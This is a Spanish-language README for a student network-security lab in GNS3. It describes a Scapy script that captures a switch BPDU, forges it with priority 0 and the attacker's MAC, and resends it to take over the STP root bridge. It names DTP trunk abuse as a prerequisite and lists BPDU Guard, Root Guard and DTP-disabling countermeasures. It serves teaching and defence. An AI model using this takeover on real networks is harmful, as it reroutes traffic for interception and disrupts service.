![Python](https://img.shields.io/badge/Python-3.x-blue?logo=python) ![Scapy](https://img.shields.io/badge/Scapy-2.x-green) ![GNS3](https://img.shields.io/badge/GNS3-vIOS--L2-orange) ![Lab](https://img.shields.io/badge/Lab-EGALDITO__LAB-red)

# STP Root Claim Attack (Root Bridge Takeover)

> **Autor:** Edgardy Olivero | **Matricula:** 20250704  
> **Laboratorio:** EGALDITO_LAB | **Herramienta:** Python 3 + Scapy  
> **Repositorio:** [github.com/Edgardy715/STP-Root-Claim](https://github.com/Edgardy715/STP-Root-Claim)

---

## Objetivo del Laboratorio

Demostrar como un atacante puede tomar control del proceso de eleccion STP (Spanning Tree Protocol) capturando y modificando BPDUs reales del switch para reclamar el rol de Root Bridge con prioridad 0, forzando una reconvergencia STP que reorienta el trafico de la red hacia el atacante. El ataque consiste en enviar BPDUs superiores con un Bridge ID mejor que el del root activo, lo que hace que otros switches acepten al atacante como nuevo root [web:36][web:39].

**Prerequisito:** Este ataque requirio previamente explotar DTP (Dynamic Trunking Protocol) para poner el puerto de Kali en modo trunk. Eso fue posible porque SW2 tenia el puerto configurado como `switchport mode dynamic auto`, permitiendo recibir los BPDUs nativos del switch antes de capturarlos y modificarlos [web:39].

## Objetivo del Script

Capturar un BPDU real enviado por SW2 (multicast `01:80:c2:00:00:00`), modificar en memoria los campos de prioridad, Root MAC y Bridge MAC para declarar a Kali como Root Bridge con prioridad 0 y path cost 0, y retransmitir este BPDU modificado cada 2 segundos hasta que SW2 reconverja y adopte a Kali como nuevo Root Bridge [web:36][web:39].

---

## Estructura del Repositorio

```text
STP-Root-Claim/
├── Script/
│   └── STP-Root-claim.py                 ← Script principal del ataque
├── Mitigacion/
│   └── Mitigacion-STP-Root-Claim.ios     ← Comandos BPDU Guard / Root Guard
├── Conf-Topologia/
│   └── scripts_bases_configs/
│       ├── R1.ios
│       ├── SW1-VTPSERVER.ios
│       └── SW2.ios
├── Topologia/
│   └── Topologia.png
└── README.md
```

---

## Parametros del Script

| Campo modificado | Valor original (SW1/SW2) | Valor inyectado (Kali) | Efecto |
|---|---|---|---|
| `pkt[0].src` | MAC de SW2 | `kali_mac` | MAC origen del BPDU. |
| `pkt[0].rootid` | 32769 (SW1) | `0` | Prioridad Root declarada minima. |
| `pkt[0].rootmac` | `0cb5.a4d7.0000` (SW1) | `kali_mac` | Root Bridge anunciado = Kali. |
| `pkt[0].bridgeid` | 32769 (SW2) | `0` | Prioridad del bridge = 0. |
| `pkt[0].bridgemac` | `0cc0.7fb8.0000` (SW2) | `kali_mac` | Bridge anunciado = Kali. |
| `pkt[0].pathcost` | 4 | `0` | Costo de ruta directo al root = 0. |
| `pkt[0].portid` | puerto real | `0` | Port ID minimo. |
| `iface` | — | `eth0` | Interfaz en modo trunk post-DTP. |
| `sleep(2)` | — | 2 segundos | Intervalo de reenvio de BPDU. |

---

## Requisitos

```bash
# Dependencia
pip install scapy

# PREREQUISITO: eth0 debe estar en modo trunk
# (logrado via ataque DTP previo o configuracion manual)

# Verificar que eth0 recibe BPDUs
tcpdump -i eth0 ether dst 01:80:c2:00:00:00 -c 1

# Ejecutar como root
sudo python3 Script/STP-Root-claim.py
```

---

## Funcionamiento del Script

### Flujo de ejecucion

```text
1. sniff(filter="ether dst 01:80:c2:00:00:00", count=1, timeout=10)
   -> captura 1 BPDU real enviado por SW2
2. Si no llega BPDU en 10 segundos -> error y salida
3. pkt.show() -> muestra el BPDU original capturado
4. get_if_hwaddr(iface) -> obtiene MAC real de Kali
5. Modifica el BPDU en memoria:
   pkt.src       = kali_mac
   pkt.rootid    = 0
   pkt.rootmac   = kali_mac
   pkt.bridgeid  = 0
   pkt.bridgemac = kali_mac
   pkt.pathcost  = 0
   pkt.portid    = 0
6. Bucle cada 2 segundos:
   -> sendp(pkt_modificado, iface=eth0)
   -> imprime numero de BPDU enviado
7. Ctrl+C -> muestra total e instrucciones de verificacion
```

### BPDU original vs BPDU modificado

```text
Campo        Original (SW1/SW2)            Modificado (Kali)
-----------  ----------------------------  --------------------------
Root ID      32769                         0
Root MAC     0cb5.a4d7.0000 (SW1)          0c:bf:c5:c2:00:00 (Kali)
Bridge ID    32769                         0
Bridge MAC   0cc0.7fb8.0000 (SW2)          0c:bf:c5:c2:00:00 (Kali)
Path Cost    4 (link SW2-SW1)              0 (directo, sin costo)
```

### Verificacion del exito del ataque

```cisco
SW2# show spanning-tree vlan 1
  Root ID    Priority    0
             Address     0cbf.c5c2.0000
  ! Si aparece la MAC de Kali, el ataque fue exitoso
```

---

## Documentacion de la Red

### Topologia del Laboratorio

```text
+------------------+        +---------------------+        +---------------------+
|   Kali Linux     |        |        SW2          |        |        SW1          |
|   (Atacante)     |<------>|  GNS3 vIOS-L2       |<------>|  GNS3 vIOS-L2      |
|     eth0         |  Gi0/1 | VTP Client          |  Gi0/0 | VTP Server         |
| 0c:bf:c5:c2:0000 |  TRUNK | 0cc0.7fb8.0000      |        | 0cb5.a4d7.0000    |
| (post-DTP)       |        |                     |        | Root Bridge (orig.)|
+------------------+        +---------------------+        +---------------------+
                                                                       |  Gi0/1
                                                            +---------------------+
                                                            |         R1          |
                                                            |  192.168.10.1/24    |
                                                            +---------------------+
```

> Topologia completa en `Topologia/Topologia.png`

### Tabla de Direccionamiento

| Dispositivo | Interfaz | VLAN | IP / Mascara | MAC | Rol |
|---|---|---|---|---|---|
| Kali Linux | eth0 (trunk) | 1,10 | dinamica | `0c:bf:c5:c2:00:00` | Atacante |
| SW1 | Gi0/0 (trunk) | 1,10 | — | `0cb5.a4d7.0000` | Root Bridge original |
| SW2 | Gi0/0 (trunk) | 1,10 | — | `0cc0.7fb8.0000` | VTP Client |
| R1 | Gi0/0 | 10 | 192.168.10.1/24 | — | Gateway / DHCP |

```text
Antes del ataque -> Root Bridge: SW1 (Priority 32769, MAC 0cb5.a4d7.0000)
Durante el ataque -> Root Bridge: Kali (Priority 0, MAC 0c:bf:c5:c2:00:00)
```

---

## Capturas de Pantalla

| Momento | Descripcion |
|---|---|
| Pre-ataque | `show spanning-tree` muestra SW1 como Root Bridge. |
| Captura BPDU | El script muestra el BPDU original con `pkt[0].show()`. |
| Durante ataque | BPDUs enviados cada 2 segundos con Root=Kali Priority=0. |
| Reconvergencia | `show spanning-tree` muestra Kali como nuevo Root Bridge. |

---

## Contramedidas

El archivo de mitigacion esta en `Mitigacion/Mitigacion-STP-Root-Claim.ios`.

### 1. BPDU Guard — defensa principal en puertos de acceso

```cisco
en
conf term
interface GigabitEthernet0/1
 spanning-tree portfast
 spanning-tree bpduguard enable
exit

! O habilitarlo globalmente en todos los puertos PortFast
spanning-tree portfast bpduguard default
do wr
```

> Si el puerto recibe un BPDU, se desactiva automaticamente (err-disabled). BPDU Guard esta pensado para puertos de usuario no confiables [web:34][web:37][web:40][web:41].

### 2. Root Guard — protege puertos que no deben ver un nuevo Root

```cisco
interface GigabitEthernet0/1
 spanning-tree guard root
```

Root Guard evita que un puerto acepte BPDUs superiores que intenten convertir a otro equipo en Root Bridge [web:32][web:33][web:35][web:38].

### 3. Deshabilitar DTP para prevenir el trunk inicial

```cisco
interface GigabitEthernet0/1
 switchport nonegotiate
 switchport mode access
```

> Esta medida bloquea el prerequisito del ataque, porque el atacante ya no podria negociar trunk ni recibir BPDUs nativos por ese enlace [web:39].

### Verificacion

```cisco
SW2# show spanning-tree inconsistentports
SW2# show interfaces GigabitEthernet0/1 status
```

---

## Video Demostrativo

**Lista de reproduccion EGALDITO_LAB:** [Layer 2 Network Attacks](https://www.youtube.com/@Edgardy715)

---

*Laboratorio desarrollado con fines estrictamente educativos en entorno GNS3 aislado.*  
*Autor: Edgardy Olivero | 20250704 | EGALDITO_LAB*
